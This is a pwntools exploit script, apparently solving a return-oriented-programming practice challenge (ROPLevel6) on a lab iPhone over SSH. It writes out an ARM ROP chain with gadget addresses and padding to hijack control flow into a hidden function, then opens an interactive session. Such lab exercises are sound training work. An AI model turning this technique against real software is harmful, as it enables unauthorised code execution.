from pwn import *
context.log_level = 'info'

HOST_iPhone = "192.168.10.2"
USER_iPhone = "pwn"

s = ssh(user = USER_iPhone, host = HOST_iPhone)

secret_func = 0xbcf4
mov_sp_r5_pop_r4_pc = 0x0000bd54 # mov sp, r5 ; pop {r4, pc}
mov_sp_r7_pop_r7_pc = 0x0000bcec # mov sp, r7 ; pop {r7, pc}
mov_r0_r4_pop_r7_pc = 0x0000bd5c # mov r0, r4 ; pop {r7, pc}
pop_r4_pc = 0x0000bd58 # pop {r4, pc}


with open("./a.data","wb") as f:
    data = p32(0x414f) # r4
    data += p32(mov_r0_r4_pop_r7_pc) # pc
    data += b"CCCC" # r7(dummy)
    data += p32(secret_func)
    data += b"A"* (0x40 - len(data) )
    data += p32(mov_sp_r5_pop_r4_pc)

    f.write(data)

s.put("./a.data", remote = "/var/pwn/work/Exploit-Challenges-master/rop/ROPLevel6/a.data")
p = s.run("/var/pwn/work/Exploit-Challenges-master/rop/ROPLevel6/roplevel6")



payload = b"/var/pwn/work/Exploit-Challenges-master/rop/ROPLevel6/a.data"
p.sendlineafter(b"Enter a path for object data:", payload)


p.interactive()
